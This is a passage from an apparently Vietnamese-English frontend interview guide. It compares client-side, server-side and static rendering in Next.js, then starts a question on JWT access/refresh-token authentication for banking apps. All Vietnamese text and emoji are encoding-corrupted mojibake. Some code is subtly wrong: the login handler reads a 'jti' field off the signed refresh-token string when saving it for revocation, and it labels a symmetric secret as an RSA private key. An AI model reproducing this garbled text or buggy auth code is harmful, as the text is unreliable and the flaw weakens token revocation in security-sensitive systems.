[6] Browser displays HTML immediately
      â†“                 â±ï¸  User sees content: 0.5-1 second
      â†“
[7] Browser downloads JS bundle
      â†“                 (background)
      â†“
[8] Hydration - Make interactive
      â†“                 â±ï¸  0.5-1 second
      â†“
[9] Fully interactive
      â†“                 â±ï¸  Total interactive: 2-3 seconds
```

**Code Example (Next.js SSR):**

```typescript
// ============================================
// SSR Example - Next.js
// ============================================

// pages/users.tsx - SSR page
import { GetServerSideProps } from 'next';

interface User {
  id: number;
  name: string;
  email: string;
}

interface Props {
  users: User[];
}

// This function runs on SERVER for every request
export const getServerSideProps: GetServerSideProps<Props> = async () => {
  // Fetch data on server
  const res = await fetch('https://api.example.com/users');
  const users = await res.json();

  // Pass data to component as props
  return {
    props: {
      users, // This data is already available!
    },
  };
};

// Component renders on server
function UsersPage({ users }: Props) {
  // No loading state needed - data is already here!
  return (
    <div>
      <h1>Users</h1>
      <ul>
        {users.map((user) => (
          <li key={user.id}>
            {user.name} - {user.email}
          </li>
        ))}
      </ul>
    </div>
  );
}

export default UsersPage;

// ============================================
// What happens:
// ============================================
// 1. User requests /users
// 2. Next.js server:
//    - Runs getServerSideProps()
//    - Fetches data from API
//    - Renders component to HTML string
//    - Sends full HTML to browser
// 3. Browser displays HTML immediately (0.5-1s)
// 4. JavaScript hydrates in background
// 5. Page becomes interactive (2-3s total)

// ============================================
// HTML sent to browser (Full content!):
// ============================================
// <!DOCTYPE html>
// <html>
// <head>
//   <title>My App</title>
// </head>
// <body>
//   <div id="__next">
//     <div>
//       <h1>Users</h1>
//       <ul>
//         <li>John Doe - john@example.com</li>
//         <li>Jane Smith - jane@example.com</li>
//         <!-- Full content already rendered! -->
//       </ul>
//     </div>
//   </div>
//   <script src="/_next/static/bundle.js"></script>
// </body>
// </html>
```

---

#### **ğŸ“Š So SÃ¡nh Chi Tiáº¿t CSR vs SSR**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ TiÃªu ChÃ­             â”‚ CSR (Client-Side)        â”‚ SSR (Server-Side)        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Initial Load         â”‚ âŒ 3-5 seconds           â”‚ âœ… 0.5-1 second          â”‚
â”‚ Time to Interactive  â”‚ âœ… 3-5 seconds           â”‚ âš ï¸  2-3 seconds          â”‚
â”‚ SEO                  â”‚ âŒ Poor (empty HTML)     â”‚ âœ… Excellent (full HTML) â”‚
â”‚ Server Load          â”‚ âœ… Low (serve static)    â”‚ âŒ High (render per req) â”‚
â”‚ Complexity           â”‚ âœ… Simple                â”‚ âŒ Complex               â”‚
â”‚ Navigation Speed     â”‚ âœ… Instant               â”‚ âš ï¸  Slower (re-render)   â”‚
â”‚ Bundle Size          â”‚ âŒ Large (500KB-2MB)     â”‚ âš ï¸  Medium (same JS)     â”‚
â”‚ Blank Screen         â”‚ âŒ Yes (before hydrate)  â”‚ âœ… No (HTML ready)       â”‚
â”‚ API Calls            â”‚ âŒ Client (slow)         â”‚ âœ… Server (fast)         â”‚
â”‚ Caching              â”‚ âœ… Easy (CDN)            â”‚ âš ï¸  Complex (per-user)   â”‚
â”‚ Cost                 â”‚ âœ… Low (CDN only)        â”‚ âŒ High (servers)        â”‚
â”‚ User Experience      â”‚ âš ï¸  Initial: Poor        â”‚ âœ… Initial: Great        â”‚
â”‚                      â”‚ âœ… After load: Great     â”‚ âš ï¸  Navigation: OK       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸ¯ Use Cases - Khi NÃ o DÃ¹ng CSR vs SSR?**

**âœ… DÃ¹ng CSR khi:**

```typescript
// 1. Admin Dashboard / Internal Tools
// - KhÃ´ng cáº§n SEO
// - User Ä‘Ã£ logged in
// - Rich interactions
// - Example: Analytics dashboard, CRM

// 2. SPAs with Auth
// - Dashboard, Settings
// - User profile pages
// - Tools, calculators

// 3. Highly Interactive Apps
// - Drawing apps
// - Games
// - Real-time collaboration tools

// Example:
const AdminDashboard = () => {
  return (
    <div>
      <Chart data={realtimeData} /> {/* Real-time updates */}
      <DataGrid onEdit={handleEdit} /> {/* Complex interactions */}
    </div>
  );
};
```

**âœ… DÃ¹ng SSR khi:**

```typescript
// 1. Public Content / Marketing
// - Landing pages
// - Blogs, News
// - E-commerce product pages
// - Example: Company website, Blog

// 2. SEO-Critical Pages
// - Product listings
// - Article pages
// - Search result pages

// 3. Dynamic Content
// - Personalized homepages
// - Location-based content
// - User-specific dashboards

// Example:
export const getServerSideProps = async (context) => {
  // Fetch based on user location
  const { country } = context.req.geo;
  const products = await fetchProductsByCountry(country);

  return { props: { products } };
};

const ProductPage = ({ products }) => {
  return (
    <div>
      <h1>Products in Your Region</h1>
      {products.map((p) => (
        <ProductCard key={p.id} {...p} />
      ))}
    </div>
  );
};
```

---

#### **âš¡ Hybrid Approach - Static Site Generation (SSG)**

Next.js cÃ²n cÃ³ SSG (Static Site Generation) - best of both worlds:

```typescript
// ============================================
// SSG Example - Next.js
// ============================================

// Build time: Generate static HTML
export const getStaticProps: GetStaticProps = async () => {
  // This runs at BUILD TIME, not per request
  const res = await fetch('https://api.example.com/posts');
  const posts = await res.json();

  return {
    props: { posts },
    revalidate: 60, // Re-generate every 60 seconds (ISR)
  };
};

// Component
const BlogPage = ({ posts }) => {
  return (
    <div>
      <h1>Blog Posts</h1>
      {posts.map((post) => (
        <article key={post.id}>
          <h2>{post.title}</h2>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </div>
  );
};

// ============================================
// Benefits:
// ============================================
// âœ… Fast as CSR (served from CDN)
// âœ… SEO-friendly like SSR
// âœ… No server rendering cost
// âœ… ISR (Incremental Static Regeneration)

// Timeline:
// [Build] Generate HTML â†’ Deploy to CDN
//    â†“
// [Request] CDN â†’ Browser (instant!)
//    â†“
// [Background] Re-validate every 60s
```

---

#### **ğŸ“‹ Best Practices**

**1. CSR Optimization:**

```typescript
// âœ… Code splitting
import { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <HeavyComponent />
    </Suspense>
  );
}

// âœ… Preload critical data
<link rel="preload" href="/api/users" as="fetch" crossOrigin="anonymous" />

// âœ… Service Worker caching
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}
```

**2. SSR Optimization:**

```typescript
// âœ… Cache rendered pages
import { NextResponse } from 'next/server';

export async function middleware(request) {
  const response = NextResponse.next();
  response.headers.set('Cache-Control', 'public, max-age=60, stale-while-revalidate=120');
  return response;
}

// âœ… Streaming SSR (React 18)
import { renderToReadableStream } from 'react-dom/server';

const stream = await renderToReadableStream(<App />);
return new Response(stream);

// âœ… Selective hydration
<div suppressHydrationWarning>{serverOnlyContent}</div>
```

**3. Hybrid Strategy:**

```typescript
// âœ… Mix CSR + SSR + SSG
// - SSG: Static pages (blog, docs)
// - SSR: Dynamic pages (user profile)
// - CSR: Interactive parts (comments, likes)

// pages/post/[id].tsx
export const getStaticProps = async ({ params }) => {
  const post = await fetchPost(params.id); // SSG
  return { props: { post } };
};

const PostPage = ({ post }) => {
  return (
    <div>
      {/* SSG content */}
      <article>{post.content}</article>

      {/* CSR interactive part */}
      <Comments postId={post.id} />
      <LikeButton postId={post.id} />
    </div>
  );
};
```

---

#### **ğŸ” Debugging & Measuring**

```typescript
// 1. Measure Time to First Byte (TTFB)
performance.getEntriesByType('navigation')[0].responseStart;

// 2. Measure First Contentful Paint (FCP)
new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('FCP:', entry.startTime);
  }
}).observe({ entryTypes: ['paint'] });

// 3. Detect SSR vs CSR
const isSSR = typeof window === 'undefined';
console.log('Rendering on:', isSSR ? 'Server' : 'Client');

// 4. Chrome DevTools
// - Network tab: Check HTML size (SSR = large, CSR = small)
// - Performance tab: Check rendering timeline
// - Lighthouse: Run audit for SSR vs CSR
```

---

#### **âŒ Common Mistakes**

```typescript
// âŒ MISTAKE 1: Using window/document in SSR
function MyComponent() {
  const width = window.innerWidth; // âŒ Error: window is not defined
  return <div style={{ width }}></div>;
}

// âœ… FIX: Check environment
function MyComponent() {
  const [width, setWidth] = useState(0);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      setWidth(window.innerWidth);
    }
  }, []);

  return <div style={{ width }}></div>;
}

// âŒ MISTAKE 2: Fetching data in useEffect for SSR
export default function Page() {
  const [data, setData] = useState(null);

  useEffect(() => {
    fetch('/api/data').then(/* ... */); // âŒ Runs on client!
  }, []);

  return <div>{data?.title}</div>;
}

// âœ… FIX: Use getServerSideProps
export const getServerSideProps = async () => {
  const data = await fetch('/api/data').then((r) => r.json());
  return { props: { data } };
};

export default function Page({ data }) {
  return <div>{data.title}</div>; // âœ… Data already available
}

// âŒ MISTAKE 3: Over-using SSR
// Don't SSR everything - mix strategies!

// âœ… GOOD: Strategic mix
// - SSG: Blog posts, docs (static)
// - SSR: User dashboard (dynamic)
// - CSR: Admin panel (no SEO needed)
```

---

#### **ğŸ“Š Real-world Performance Comparison**

```typescript
// Example: E-commerce Product Page

// CSR (Create React App):
// - Initial Load: 3.5 seconds
// - Time to Interactive: 3.5 seconds
// - Lighthouse Score: 40/100
// - SEO: âŒ Poor (Google sees empty HTML)

// SSR (Next.js):
// - Initial Load: 1.2 seconds
// - Time to Interactive: 2.8 seconds
// - Lighthouse Score: 85/100
// - SEO: âœ… Excellent (Google sees full content)

// SSG (Next.js ISR):
// - Initial Load: 0.5 seconds (CDN)
// - Time to Interactive: 1.8 seconds
// - Lighthouse Score: 95/100
// - SEO: âœ… Excellent + fast delivery
```

---

#### **ğŸ¯ Decision Tree**

```
Start
  â†“
SEO needed?
  â”œâ”€ No â†’ CSR (React, Vue, Angular SPA)
  â”‚
  â””â”€ Yes â†’ Content changes frequently?
           â”œâ”€ No â†’ SSG (Next.js, Gatsby)
           â”‚        - Blog, docs, marketing
           â”‚
           â””â”€ Yes â†’ Per-user content?
                    â”œâ”€ No â†’ SSR with cache
                    â”‚        - News, products
                    â”‚
                    â””â”€ Yes â†’ SSR + ISR
                             - User dashboards
                             - Personalized pages
```

---

#### **ğŸ’¡ Summary**

**CSR (Client-Side Rendering):**

- âœ… Best for: SPAs, admin tools, internal apps
- âœ… Pros: Simple, fast navigation, low server cost
- âŒ Cons: Slow initial load, poor SEO, blank screen

**SSR (Server-Side Rendering):**

- âœ… Best for: Public pages, SEO-critical, e-commerce
- âœ… Pros: Fast initial load, SEO-friendly, no blank screen
- âŒ Cons: High server cost, complex, slower navigation

**SSG (Static Site Generation):**

- âœ… Best for: Blogs, docs, marketing pages
- âœ… Pros: Fastest, SEO-friendly, low cost (CDN)
- âŒ Cons: Stale data (solved with ISR)

**Modern Approach:**

```typescript
// Mix all three strategies!
// - SSG for static pages (blog, docs)
// - SSR for dynamic pages (user profile, search)
// - CSR for interactive parts (comments, likes)

// Example: E-commerce site
// - Homepage: SSG (revalidate hourly)
// - Product page: SSR (real-time inventory)
// - Cart: CSR (no SEO needed)
// - Checkout: SSR (security + UX)
```

**Key Takeaway:**

- There's NO "best" approach - choose based on requirements
- Modern frameworks (Next.js, Remix) support all strategies
- Measure with real data: TTFB, FCP, TTI, Lighthouse
- SEO + Performance = SSR/SSG
- Interactivity + Simple = CSR

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ« Q55: Authentication Flow An ToÃ n Cho Há»‡ Thá»‘ng NgÃ¢n HÃ ng/Chá»©ng KhoÃ¡n - Access Token, Refresh Token, Cookie Security</span></summary>


**Tráº£ lá»i:**

Há»‡ thá»‘ng authentication cho ngÃ¢n hÃ ng/chá»©ng khoÃ¡n yÃªu cáº§u **báº£o máº­t cá»±c ká»³ cao** vÃ¬ liÃªn quan Ä‘áº¿n tiá»n báº¡c vÃ  thÃ´ng tin nháº¡y cáº£m. Flow chuáº©n sá»­ dá»¥ng **JWT (JSON Web Token)** vá»›i **Access Token + Refresh Token** káº¿t há»£p **httpOnly Cookie**.

#### **ğŸ“Š Tá»•ng Quan Authentication Flow**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              SECURE AUTHENTICATION FLOW                            â”‚
â”‚        (Banking/Trading System - Há»‡ Thá»‘ng NgÃ¢n HÃ ng)              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                    â”‚
â”‚  ğŸ”‘ ACCESS TOKEN                                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Thá»i háº¡n: 15 phÃºt (ngáº¯n)                                   â”‚ â”‚
â”‚  â”‚ â€¢ LÆ°u á»Ÿ: Memory (JavaScript variable)                       â”‚ â”‚
â”‚  â”‚ â€¢ DÃ¹ng Ä‘á»ƒ: Gá»i API (Authorization: Bearer <token>)          â”‚ â”‚
â”‚  â”‚ â€¢ Máº¥t khi: Refresh page (pháº£i láº¥y láº¡i)                      â”‚ â”‚
â”‚  â”‚ â€¢ Báº£o máº­t: KhÃ´ng lÆ°u localStorage (XSS risk)                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                                    â”‚
â”‚  ğŸ”„ REFRESH TOKEN                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Thá»i háº¡n: 7-30 ngÃ y (dÃ i)                                  â”‚ â”‚
â”‚  â”‚ â€¢ LÆ°u á»Ÿ: httpOnly Cookie (server-side chá»‰ Ä‘á»c Ä‘Æ°á»£c)         â”‚ â”‚
â”‚  â”‚ â€¢ DÃ¹ng Ä‘á»ƒ: Láº¥y Access Token má»›i khi háº¿t háº¡n                 â”‚ â”‚
â”‚  â”‚ â€¢ Báº£o máº­t: httpOnly + Secure + SameSite=Strict              â”‚ â”‚
â”‚  â”‚ â€¢ KhÃ´ng Ä‘á»c Ä‘Æ°á»£c bá»Ÿi JavaScript (chá»‘ng XSS)                 â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                                    â”‚
â”‚  ğŸª SESSION COOKIE (Optional - cho Banking)                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Thá»i háº¡n: Session (Ä‘Ã³ng browser = máº¥t)                    â”‚ â”‚
â”‚  â”‚ â€¢ LÆ°u á»Ÿ: httpOnly Cookie                                    â”‚ â”‚
â”‚  â”‚ â€¢ DÃ¹ng Ä‘á»ƒ: Session ID (server tracking)                     â”‚ â”‚
â”‚  â”‚ â€¢ Báº£o máº­t: httpOnly + Secure                                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸ” 1. Access Token vs Refresh Token - PhÃ¢n Biá»‡t Chi Tiáº¿t**

**Access Token (Token Truy Cáº­p):**

```typescript
// Cáº¥u trÃºc JWT Access Token
{
  "header": {
    "alg": "RS256",      // Thuáº­t toÃ¡n mÃ£ hÃ³a (RSA + SHA256)
    "typ": "JWT"
  },
  "payload": {
    "sub": "user123",    // User ID
    "name": "John Doe",
    "email": "john@example.com",
    "role": "trader",    // Role: admin, trader, customer
    "permissions": ["trade", "view_balance", "transfer"],
    "iat": 1699999999,   // Issued At (thá»i Ä‘iá»ƒm táº¡o)
    "exp": 1700000899    // Expiry (háº¿t háº¡n sau 15 phÃºt)
  },
  "signature": "..."     // Chá»¯ kÃ½ sá»‘ (verify token khÃ´ng bá»‹ giáº£ máº¡o)
}

// Äáº·c Ä‘iá»ƒm:
// âœ… Thá»i háº¡n ngáº¯n: 5-15 phÃºt
// âœ… LÆ°u trong memory (JavaScript variable)
// âœ… Gá»­i kÃ¨m má»i API request: Authorization: Bearer <token>
// âœ… Chá»©a thÃ´ng tin user (role, permissions)
// âŒ KHÃ”NG lÆ°u localStorage/sessionStorage (XSS risk)
```

**Refresh Token (Token LÃ m Má»›i):**

```typescript
// Cáº¥u trÃºc Refresh Token (thÆ°á»ng lÃ  random string)
{
  "jti": "unique-token-id-abc123xyz",  // Token ID duy nháº¥t
  "sub": "user123",                    // User ID
  "iat": 1699999999,                   // Issued At
  "exp": 1702591999                    // Expiry (háº¿t háº¡n sau 30 ngÃ y)
}

// Äáº·c Ä‘iá»ƒm:
// âœ… Thá»i háº¡n dÃ i: 7-30 ngÃ y (hoáº·c vÃ´ thá»i háº¡n)
// âœ… LÆ°u trong httpOnly Cookie (khÃ´ng Ä‘á»c Ä‘Æ°á»£c báº±ng JS)
// âœ… Chá»‰ dÃ¹ng Ä‘á»ƒ láº¥y Access Token má»›i
// âœ… CÃ³ thá»ƒ revoke (thu há»“i) tá»« server
// âŒ KHÃ”NG gá»­i kÃ¨m API thÆ°á»ng (chá»‰ gá»­i tá»›i /refresh endpoint)
```

**Táº¡i Sao Cáº§n 2 Token?**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Táº I SAO Cáº¦N 2 TOKEN?                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                            â”‚
â”‚  Scenario 1: Chá»‰ dÃ¹ng 1 Access Token dÃ i háº¡n              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ âŒ Náº¿u token bá»‹ leak (XSS, network sniffing)         â”‚ â”‚
â”‚  â”‚    â†’ Hacker cÃ³ 30 ngÃ y Ä‘á»ƒ dÃ¹ng token                 â”‚ â”‚
â”‚  â”‚    â†’ KhÃ´ng thá»ƒ thu há»“i (revoke)                      â”‚ â”‚
â”‚  â”‚    â†’ Rá»¦I RO Cá»°C CAO!                                 â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                            â”‚
â”‚  Scenario 2: DÃ¹ng Access Token (15 phÃºt) + Refresh Token  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ âœ… Access Token bá»‹ leak                              â”‚ â”‚
â”‚  â”‚    â†’ Chá»‰ dÃ¹ng Ä‘Æ°á»£c 15 phÃºt                           â”‚ â”‚
â”‚  â”‚    â†’ Tá»± Ä‘á»™ng háº¿t háº¡n                                 â”‚ â”‚
â”‚  â”‚                                                       â”‚ â”‚
â”‚  â”‚ âœ… Refresh Token bá»‹ leak                             â”‚ â”‚
â”‚  â”‚    â†’ LÆ°u httpOnly cookie (khÃ³ bá»‹ XSS)               â”‚ â”‚
â”‚  â”‚    â†’ Server cÃ³ thá»ƒ revoke (blacklist)               â”‚ â”‚
â”‚  â”‚    â†’ CÃ³ thá»ƒ detect suspicious activity               â”‚ â”‚
â”‚  â”‚                                                       â”‚ â”‚
â”‚  â”‚ â†’ Rá»¦I RO THáº¤P HÆ N NHIá»€U!                             â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸ”„ 2. Authentication Flow Chi Tiáº¿t (Step-by-Step)**

**A. Login Flow (ÄÄƒng Nháº­p):**

```typescript
// ============================================
// BÆ¯á»šC 1: User Login
// ============================================

// Frontend: Gá»­i username + password
async function login(username: string, password: string) {
  try {
    const response = await fetch('https://api.bank.com/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username,
        password,
        // Optional: MFA code, device fingerprint
        mfaCode: '123456',
        deviceId: getDeviceFingerprint(),
      }),
      credentials: 'include', // Quan trá»ng: Cho phÃ©p gá»­i/nháº­n cookie
    });

    if (!response.ok) {
      throw new Error('Login failed');
    }

    const data = await response.json();
    
    // {
    //   accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
    //   user: { id: "123", name: "John", role: "trader" },
    //   expiresIn: 900  // 15 phÃºt (900 giÃ¢y)
    // }
    
    // Refresh Token Ä‘Æ°á»£c server tá»± Ä‘á»™ng set vÃ o httpOnly cookie
    // Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
    
    return data;
  } catch (error) {
    console.error('Login error:', error);
    throw error;
  }
}

// ============================================
// BÆ¯á»šC 2: Server Xá»­ LÃ½ Login
// ============================================

// Backend (Node.js/Express)
app.post('/auth/login', async (req, res) => {
  const { username, password, mfaCode } = req.body;
  
  // 1. Verify username + password (bcrypt)
  const user = await db.findUserByUsername(username);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // 2. Verify MFA (Multi-Factor Authentication)
  if (!verifyMFA(user, mfaCode)) {
    return res.status(401).json({ error: 'Invalid MFA code' });
  }
  
  // 3. Check account status (not locked, not suspended)
  if (user.isLocked || user.isSuspended) {
    return res.status(403).json({ error: 'Account locked' });
  }
  
  // 4. Generate Access Token (15 phÃºt)
  const accessToken = jwt.sign(
    {
      sub: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
      permissions: user.permissions,
    },
    process.env.ACCESS_TOKEN_SECRET,  // Private key (RSA)
    { expiresIn: '15m' }  // 15 phÃºt
  );
  
  // 5. Generate Refresh Token (30 ngÃ y)
  const refreshToken = jwt.sign(
    {
      jti: uuidv4(),  // Unique token ID
      sub: user.id,
    },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '30d' }  // 30 ngÃ y
  );
  
  // 6. LÆ°u Refresh Token vÃ o database (Ä‘á»ƒ cÃ³ thá»ƒ revoke sau)
  await db.saveRefreshToken({
    tokenId: refreshToken.jti,
    userId: user.id,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    deviceInfo: req.headers['user-agent'],
    ipAddress: req.ip,
  });
  
  // 7. Set Refresh Token vÃ o httpOnly Cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,    // JavaScript khÃ´ng Ä‘á»c Ä‘Æ°á»£c (chá»‘ng XSS)
    secure: true,      // Chá»‰ gá»­i qua HTTPS
    sameSite: 'strict', // Chá»‘ng CSRF
    maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngÃ y
    path: '/auth/refresh',  // Chá»‰ gá»­i tá»›i endpoint refresh
  });
  
  // 8. Log login event (audit trail)
  await logEvent({
    type: 'LOGIN_SUCCESS',
    userId: user.id,
    ipAddress: req.ip,
    deviceInfo: req.headers['user-agent'],
    timestamp: new Date(),
  });
  
  // 9. Return Access Token vá» client
  res.json({
    accessToken,
    user: {
      id: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
    },
    expiresIn: 900,  // 15 phÃºt
  });
});

// ============================================
// BÆ¯á»šC 3: Frontend LÆ°u Access Token
// ============================================

// Store Access Token in memory (JavaScript variable)
let accessToken: string | null = null;

async function handleLogin(username: string, password: string) {
  const response = await login(username, password);
  
  // LÆ°u Access Token trong memory
  accessToken = response.accessToken;
  
  // LÆ°u user info (khÃ´ng sensitive) vÃ o localStorage
  localStorage.setItem('user', JSON.stringify(response.user));
  
  // Redirect to dashboard
  window.location.href = '/dashboard';
}

// âŒ KHÃ”NG BAO GIá»œ LÃ€M NHÆ¯ NÃ€Y:
// localStorage.setItem('accessToken', token);  // XSS risk!
// sessionStorage.setItem('accessToken', token); // Váº«n XSS risk!
```

---

